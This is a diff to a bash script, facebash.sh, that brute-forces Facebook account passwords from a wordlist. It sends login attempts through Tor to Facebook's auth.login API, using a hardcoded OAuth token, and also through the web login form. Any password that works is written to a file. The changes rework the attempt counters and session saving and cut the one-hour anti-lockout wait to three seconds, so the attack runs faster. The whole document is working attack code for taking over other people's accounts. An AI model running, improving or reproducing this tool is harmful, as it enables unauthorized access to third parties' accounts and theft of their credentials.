@@ -86,7 +86,7 @@ if [[ ! -d sessions ]]; then
 mkdir sessions
 fi
 cum=$(grep -n "$PASS" "$wl_pass" | cut -d ":" -f1)
-printf "EMAIL=\"%s\"\nPASS=\"%s\"\nwl_pass=\"%s\"\ncum=\"%s\"\ntoken=\"%s\"\n" $EMAIL $PASS $wl_pass $cum $cum > sessions/store.session.$EMAIL.$(date +"%FT%H%M")
+printf "EMAIL=\"%s\"\nPASS=\"%s\"\nwl_pass=\"%s\"\ncum=\"%s\"\ntoken=\"%s\"\n" $EMAIL $PASS $wl_pass $token $token > sessions/store.session.$EMAIL.$(date +"%FT%H%M")
 printf "\e[1;77mSession saved.\e[0m\n"
 printf "\e[1;92mUse ./facebash.sh --resume\n"
 else
@@ -112,8 +112,8 @@ while [ $counter -lt $turn ]; do
 IFS=$'\n'
 for PASS in $(sed -n ''$((startline+sumstart))','$endline'p' $wl_pass); do
 countpass=$(grep -n "$PASS" "$wl_pass" | cut -d ":" -f1)
-
-printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $countpass $count_pass $PASS
+token=$(($counter+1))
+printf "\e[1;77mTrying pass (%s/%s)\e[0m: \"%s\"\n" $token $count_pass $PASS
 sleep 1
 {( trap '' SIGINT && check=$( curl --socks5 localhost:9050 -s 'https://b-api.facebook.com/method/auth.login' --user-agent "Firefox" -L -H "Authorization: OAuth 200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16" -d "email=$EMAIL&password=$PASS" | grep -o "session_key" | uniq ); if [[ $check == "session_key" ]]; then printf "\e[1;92m \n  [*] Password Found: %s\n " $PASS; printf "Username: %s, Password: %s\n" $EMAIL $PASS >> found.facebash ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.facebash \n\e[0m";  kill -1 $$ ; fi ) } & done; wait $!;
 let counter++
@@ -133,9 +133,10 @@ while [ $counter2 -lt $turn ]; do
 IFS=$'\n'
 for PASS in $(sed -n ''$((startline+sumstart))','$endline'p' $wl_pass); do
 countpass=$(grep -n "$PASS" "$wl_pass" | cut -d ":" -f1)
+token=$(($counter2+1))
 COOKIES='cookies'$countpass''
-printf "method 2 \n"
-printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $countpass $count_pass $PASS
+#printf "method 2 \n"
+printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $token $count_pass $PASS
 
 {( trap '' SIGINT && curl -s -X GET --socks5-hostname localhost:9050 'https://www.facebook.com/home.php' --user-agent $USER_AGENT --cookie $COOKIES --cookie-jar $COOKIES --location > /dev/null && curl -s -X POST --socks5-hostname localhost:9050 'https://login.facebook.com/login.php'  --user-agent $USER_AGENT --data-urlencode "email=${EMAIL}" --data-urlencode "pass=${PASS}" --cookie $COOKIES --cookie-jar $COOKIES > /dev/null && var=$( curl -s -X GET --socks5-hostname localhost:9050 'https://www.facebook.com/home.php'  --user-agent $USER_AGENT --cookie $COOKIES --cookie-jar $COOKIES | grep -o "logoutMenu" | uniq ); if [[ $var == "logoutMenu" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n " $PASS; printf "Username: %s, Password: %s\n" $EMAIL $PASS >> found.facebash ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instashell \n\e[0m";  kill -1 $$ ; fi; ) } & done; wait $!;
 rm -rf cookies$countpass
@@ -154,16 +155,18 @@ while [ $counter1 -lt $turn ]; do
 threads=1
 IFS=$'\n'
 for PASS in $(sed -n ''$token','$(($cum+1))'p' $wl_pass); do
+
+#countpass=$(grep -n "$PASS" "$wl_pass" | cut -d ":" -f1)
+#childcount=$(($counter1))
+printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $token $count_pass $PASS
 let token++
-countpass=$(grep -n "$PASS" "$wl_pass" | cut -d ":" -f1)
-printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $countpass $count_pass $PASS
-sleep 1
+#sleep 1
 {( trap '' SIGINT && check=$( curl --socks5 localhost:9050 -s 'https://b-api.facebook.com/method/auth.login' --user-agent "Firefox" -L -H "Authorization: OAuth 200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16" -d "email=$EMAIL&password=$PASS" | grep -o "session_key" | uniq ); if [[ $check == "session_key" ]]; then printf "\e[1;92m \n  [*] Password Found: %s\n " $PASS; printf "Username: %s, Password: %s\n" $EMAIL $PASS >> found.facebash ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.facebash \n\e[0m";  kill -1 $$ ; fi ) } & done; wait $!;
 let counter1++
 let threads++
 let startline++
 let endline++
-let countpass++
+#let countpass++
 let cum++
 changeip
 done
@@ -181,8 +184,9 @@ for PASS in $(sed -n ''$token','$(($cum+1))'p' $wl_pass); do
 let countpass++
 
 COOKIES='cookies'$countpass''
-echo "method 2: \n"
-printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $countpass $count_pass $PASS
+#echo "method 2: \n"
+#childcount=$(($counter22))
+printf "\e[1;77mTrying pass (%s/%s)\e[0m: %s\n" $token $count_pass $PASS
 
 {( trap '' SIGINT && curl -s -X GET --socks5-hostname localhost:9050 'https://www.facebook.com/home.php' --user-agent $USER_AGENT --cookie $COOKIES --cookie-jar $COOKIES --location > /dev/null && curl -s -X POST --socks5-hostname localhost:9050 'https://login.facebook.com/login.php'  --user-agent $USER_AGENT --data-urlencode "email=${EMAIL}" --data-urlencode "pass=${PASS}" --cookie $COOKIES --cookie-jar $COOKIES > /dev/null && var=$( curl -s -X GET --socks5-hostname localhost:9050 'https://www.facebook.com/home.php'  --user-agent $USER_AGENT --cookie $COOKIES --cookie-jar $COOKIES | grep -o "logoutMenu" | uniq ); if [[ $var == "logoutMenu" ]]; then printf "\e[1;92m \n [*] Password Found: %s\n " $PASS; printf "Username: %s, Password: %s\n" $EMAIL $PASS >> found.facebash ; printf "\e[1;92m [*] Saved:\e[0m\e[1;77m found.instashell \n\e[0m";  kill -1 $$ ; fi; ) } & done; wait $!;
 rm -rf cookies$countpass
@@ -260,7 +264,7 @@ dat=$(($hourdate + 1))
 mindate=$(date +%M:%S)
 printf "\e[1;91m[*] Waiting 1 hour, to return at:\e[0m\e[1;93m %s:%s\n\e[0m" $dat $mindate
 let turn+=20
-sleep 3600
+sleep 3
 method2
 hourdate2=$(date +%H)
 dat2=$(($hourdate2 + 1))
